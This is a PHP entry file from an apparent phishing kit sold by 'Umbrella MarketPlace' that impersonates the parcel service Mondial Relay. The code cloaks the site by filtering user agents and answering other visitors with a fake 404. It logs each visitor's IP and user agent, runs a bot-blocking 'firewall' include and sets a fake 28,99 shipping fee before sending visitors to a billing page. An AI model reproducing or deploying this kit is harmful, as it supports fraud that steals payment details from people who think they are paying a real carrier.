<?php

/*
/$$                             /$$                         /$$      /$$           /$$      
| $$                            | $$                        | $$  /$ | $$          | $$      
| $$        /$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$ | $$$$$$$ 
| $$       /$$__  $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$| $$/$$ $$ $$ /$$__  $$| $$__  $$
| $$      | $$$$$$$$|  $$$$$$   | $$    | $$$$$$$$| $$  \__/| $$$$_  $$$$| $$$$$$$$| $$  \ $$
| $$      | $$_____/ \____  $$  | $$ /$$| $$_____/| $$      | $$$/ \  $$$| $$_____/| $$  | $$
| $$$$$$$$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$/   \  $$|  $$$$$$$| $$$$$$$/
|________/ \_______/|_______/    \___/   \_______/|__/      |__/     \__/ \_______/|_______/ 
                                                                                             
☔️ Umbrella MarketPlace - All Rights Reserved☔️

🎄 Base : Mondial Relay
☔️ Link : https://Umbrella-Pass.com
👨‍💻 Author : @ChezLesterWeb - @LesterWeb / https://t.me/ChezLesterWeb - https://t.me/LesterWeb
*/                                                                                                                                                                           

session_start();

function isMobile() {
    return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows NT|Macintosh|Windows|Mac/", $_SERVER['HTTP_USER_AGENT']);
}
  
if (!isMobile()) {
    die(header('HTTP/1.0 404 Not Found'));
}

include('common/includes.php');

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];

$_SESSION['bot'] = true;

require('firewall.php');

$_SESSION['Transport_Price'] = isset($montant) ? $montant : '28,99';

if ($_SESSION['bot'] == false) {
    header('Location: /pages/billing.php');
    exit();
}
?>
